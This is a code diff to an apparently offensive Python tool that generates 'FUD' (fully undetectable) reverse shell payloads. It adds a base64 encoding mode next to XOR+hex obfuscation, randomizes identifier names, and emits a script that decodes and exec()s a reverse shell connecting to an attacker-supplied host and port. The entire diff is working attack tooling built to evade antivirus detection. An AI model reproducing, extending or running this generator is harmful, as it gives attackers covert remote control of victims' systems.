@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 import argparse
 import binascii
+import base64
 import random
 import re
 
@@ -26,6 +27,12 @@ def print_banner(banner):
     banner_colored = "".join(char_r)
     print(banner_colored)
     
+# Function To Generate An Inline Payload
+def format_inline(payload):
+    payload_lines = payload.split('\n')
+    formatted_payload = '; '.join([line.strip() for line in payload_lines if line.strip()])
+    return formatted_payload
+
 # Function To Generate Random Names
 def randomize_name(name):
     name_length = len(name)
@@ -65,7 +72,11 @@ def randomize_names(payload):
     return payload
 
 
-def reverse_shell_gen(host, port, infile, outfile):
+
+
+def reverse_shell_gen(host, port, infile, outfile, module):
+    reverse_shell_payload = ""
+
     if infile:
         with open(infile) as f:
             reverse_shell_command = f.read()
@@ -77,24 +88,34 @@ def reverse_shell_gen(host, port, infile, outfile):
         modules = set(["socket", "subprocess", "os"])
         from_imports = []
 
-    # Encoding The Reverse Shell Command into Hexadecimal
-    encoded = reverse_shell_command.encode("utf-8").hex()
+    if module == "xor":
+        text = "[+] Here Is Your Encoded Reverse Shell Payload String With Xor + Hex: \n"
+        # Encoding The Reverse Shell Command into Hexadecimal
+        encoded = reverse_shell_command.encode("utf-8").hex()
+        #Generating FUD Payload
+        for char in encoded:
+            encoded_char = ord(char) ^ 0xFF
+            reverse_shell_payload += chr(encoded_char)
+            #Generating Payload Script
+        payload_script = "import binascii\n%s\nencoded = '" % "\n".join(["import %s" % module for module in modules if module not in [i[1] for i in from_imports]] + ["from %s import %s" % (i[0], i[1]) for i in from_imports]) + reverse_shell_payload +  "'\n\ndef decode_reverse_shell(encoded):\n    decoded = ''\n    for char in encoded:\n        decoded += chr(ord(char) ^ 0xFF)\n    return binascii.unhexlify(decoded).decode('utf-8') \n\nreverse_shell_command = decode_reverse_shell(encoded) \nexec(reverse_shell_command)"
+        payload_script = randomize_names(payload_script)
+        decoded_reverse_shell = binascii.unhexlify(encoded).decode('utf-8')
+        
 
-    #Generating FUD Payload
-    reverse_shell_payload = ""
-    for char in encoded:
-        encoded_char = ord(char) ^ 0xFF
-        reverse_shell_payload += chr(encoded_char)
+    if module == "base64":
+        text = "[+] Here Is Your Encoded Reverse Shell Payload String With Base64: \n"
+        # Encoding The Reverse Shell Command into Base64
+        reverse_shell_payload = base64.b64encode(reverse_shell_command.encode('utf-8')).decode('utf-8')
+        # Generating Payload Script
+        payload_script = "import binascii\n%s\nencoded = '%s'\n\nreverse_shell_command = binascii.a2b_base64(encoded).decode('utf-8')\nexec(reverse_shell_command)" % ("\n".join(["import %s" % module for module in modules if module not in [i[1] for i in from_imports]] + ["from %s import %s" % (i[0], i[1]) for i in from_imports]), reverse_shell_payload)
+        payload_script = randomize_names(payload_script)
+        payload_script = format_inline(payload_script)
+        decoded_reverse_shell = binascii.a2b_base64(reverse_shell_payload.encode('utf8')).decode('utf8')
 
-    #Generating Payload Script
-    payload_script = "import binascii\n%s\nencoded = '" % "\n".join(["import %s" % module for module in modules if module not in [i[1] for i in from_imports]] + ["from %s import %s" % (i[0], i[1]) for i in from_imports]) + reverse_shell_payload +  "'\n\ndef decode_reverse_shell(encoded):\n    decoded = ''\n    for char in encoded:\n        decoded += chr(ord(char) ^ 0xFF)\n    return binascii.unhexlify(decoded).decode('utf-8') \n\nreverse_shell_command = decode_reverse_shell(encoded) \nexec(reverse_shell_command)"
-
-    # Randomize Function Names And Variable Names
-    payload_script = randomize_names(payload_script)
-
+    
     # Print The FUD Payload into file
     with open(outfile,'w') as f:
-        print(colored("[+] Here Is Your Encoded Reverse Shell Payload String With Xor + Hex: \n", "white", attrs=["bold"]))
+        print(colored(text, "white", attrs=["bold"]))
         if len(reverse_shell_payload) > 1000:
             print(colored(reverse_shell_payload[:1000] + ' ... (full payload length: %d chars)\n' % len(reverse_shell_payload), "green"))
         else:
@@ -103,7 +124,7 @@ def reverse_shell_gen(host, port, infile, outfile):
         
 
         print(colored("\n[+] Here Is Your Decoded Reverse Shell Command: \n", "white", attrs=["bold"]))
-        print(colored(binascii.unhexlify(encoded).decode('utf-8'),'green'))
+        print(colored(decoded_reverse_shell, 'green'))
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='Generates a reverse shell payload in Xor Encoding.')
@@ -111,6 +132,6 @@ if __name__ == '__main__':
     parser.add_argument('-lp', type=int, help='Specifies the port for the reverse shell.')
     parser.add_argument('-i', type=str, help='Specifies the input file for the payload.')
     parser.add_argument('-o', type=str, required=True, help='Specifies the output file for the payload.')
+    parser.add_argument('-m', type=str, choices=['xor','base64'], default='xor', help='Specifies the encoding module to use for the payload.')
     args = parser.parse_args()
-    print_banner(banner)
-    reverse_shell_gen(args.lh, args.lp, args.i, args.o)
+    reverse_shell_gen(args.lh, args.lp, args.i, args.o, args.m)
